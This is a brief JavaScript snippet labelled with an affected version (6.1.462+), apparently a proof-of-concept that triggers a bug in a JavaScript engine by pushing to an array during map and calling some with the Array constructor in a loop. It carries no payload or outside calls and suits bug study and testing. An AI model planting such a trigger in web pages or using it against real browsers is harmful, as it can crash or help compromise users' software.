// Impact version: 6.1.462+ 
var arr = [1]; 
for (var i = 1; i < 30; ++i) {  
    var a2 = arr.map(function(){arr.push(2);}); 
    arr.some(arr.constructor);  
    for (var j = 0; j < 10000; ++j) {} 
} 